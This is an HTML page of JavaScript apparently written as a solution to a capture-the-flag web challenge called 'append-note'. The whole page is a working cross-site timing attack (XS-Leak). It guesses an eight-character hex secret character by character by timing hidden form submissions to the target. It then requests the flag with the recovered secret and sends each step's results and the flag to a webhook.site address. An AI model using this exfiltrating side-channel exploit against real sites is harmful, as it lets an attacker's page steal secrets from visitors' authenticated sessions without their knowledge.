<!DOCTYPE html>
<html>
<head><title>XS-Leak</title></head>
<body>
<div id="s">Loading...</div>
<script>
var TARGET = "https://append-note-czwfe.instancer.lac.tf";
var WEBHOOK = "https://webhook.site/70d9bf2c-e5cf-49dc-aeed-4203dbfd538d";
var CHARS = "0123456789abcdef";

navigator.sendBeacon(WEBHOOK, "PAGE_LOADED");
new Image().src = WEBHOOK + "?m=PAGE_LOADED";

function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
function report(d) {
    navigator.sendBeacon(WEBHOOK, d);
    new Image().src = WEBHOOK + "?m=" + encodeURIComponent(d);
}
function setStatus(s) { document.getElementById('s').textContent = s; }

function testPrefix(prefix) {
    var url = TARGET + "/append?content=" + encodeURIComponent(prefix) + "&url=" + encodeURIComponent(TARGET + "/");
    var wname = 'p' + Math.random().toString(36).slice(2);
    
    return new Promise(function(resolve) {
        var form = document.createElement('form');
        form.method = 'GET';
        form.action = url;
        form.target = wname;
        form.style.display = 'none';
        document.body.appendChild(form);
        
        var t0 = performance.now();
        form.submit();
        
        setTimeout(function() {
            var elapsed = performance.now() - t0;
            try { document.body.removeChild(form); } catch(e) {}
            try { window.open('', wname).close(); } catch(e) {}
            resolve(elapsed);
        }, 300);
    });
}

async function main() {
    report('STARTED');
    setStatus('Starting...');
    
    try {
        var secretFast = "";
        var secretSlow = "";
        
        for (var pos = 0; pos < 8; pos++) {
            setStatus('Position ' + pos + '...');
            
            var results = [];
            for (var i = 0; i < CHARS.length; i++) {
                var c = CHARS[i];
                var time = await testPrefix(secretFast + c);
                results.push({ c: c, time: time });
                await sleep(10);
            }
            
            results.sort(function(a, b) { return a.time - b.time; });
            var fast = results[0];
            var slow = results[results.length - 1];
            
            secretFast += fast.c;
            secretSlow += slow.c;
            
            report('P' + pos + ':F=' + fast.c + ':' + fast.time.toFixed(0) + ',S=' + slow.c + ':' + slow.time.toFixed(0));
        }
        
        report('SECRETS:F=' + secretFast + ',S=' + secretSlow);
        
        var r1 = await fetch(TARGET + "/flag?secret=" + secretFast);
        var f1 = await r1.text();
        report('FLAG_F:' + f1);
        
        var r2 = await fetch(TARGET + "/flag?secret=" + secretSlow);
        var f2 = await r2.text();
        report('FLAG_S:' + f2);
        
        setStatus('Done: ' + f1 + ' / ' + f2);
    } catch(e) {
        report('ERR:' + e.message);
    }
}

main();
</script>
</body>
</html>
